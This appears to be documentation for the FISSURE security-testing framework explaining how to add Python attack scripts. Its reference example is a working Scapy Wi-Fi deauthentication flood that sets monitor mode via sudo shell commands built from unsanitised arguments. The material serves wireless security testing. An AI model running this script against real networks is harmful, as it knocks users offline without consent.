# Attack Python Scripts

## Creating Python Scripts
Non-GNU Radio attacks can be added to the FISSURE library by uploading specially configured Python (.py) files. A function is needed within the Python script to identify which variables can be modified in the FISSURE Dashboard (`getArguments()`). Those variables are used by the system as command line arguments during execution of the script. All FISSURE branches accept both Python2 and Python3 attack scripts.

### Scapy Example
The following example uses Scapy to send multiple deauthentication frames from a wireless interface. Use the code as a reference for creating future Python scripts. 
```
from scapy.all import Dot11,Dot11Deauth,RadioTap,sendp
import os, sys

#################################################
############ Default FISSURE Header ############
#################################################
def getArguments():
    client = '00:11:22:33:44:55'        # Target MAC address
    bssid = 'AA:BB:CC:11:22:33'         # Access Point MAC address  
    iface = 'wlan0'	                    # Wireless interface name 
    channel = 1                         # Wireless channel
    interval = 0.01                     # Scapy interval
    arg_names = ['client','bssid','iface','channel','interval']
    arg_values = [client, bssid, iface, channel, interval]

    return (arg_names,arg_values)


if __name__ == "__main__":

    # Default Values
    client = '00:11:22:33:44:55'        # Target MAC address
    bssid = 'AA:BB:CC:11:22:33'         # Access Point MAC address  
    iface = 'wlan0'                     # Wireless interface name 
    channel = '1'                       # Wireless channel
    interval = '0.01'                   # Scapy interval

    # Accept Command Line Arguments
    try:
        client = sys.argv[1]
        bssid = sys.argv[2]
        iface = sys.argv[3]
        channel = sys.argv[4]
        interval = sys.argv[5]
    except:
        pass

#################################################
    
    # Create Frame
    packet = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)

    # Set Monitor Mode and Channel
    os.system("sudo ifconfig " + iface + " down") 
    os.system("sudo iwconfig " + iface + " mode monitor") 
    os.system("sudo ifconfig " + iface + " up") 
    os.system("sudo iwconfig " + iface + " channel " + channel) 
	
    # Send Frame  
    sendp(packet, iface=iface, inter=float(interval), loop=1)
```

## Uploading Attack Files
Python files can be uploaded to FISSURE within the _Library>>Add_ tab by choosing a protocol and selecting "Attack". The file type must be set to "Python2 Script" or "Python3 Script" and the file must have a valid .py extension. Attacks added to the library and named with a proper "Attack Template Name" will immediately show up in the Attack tree widget.
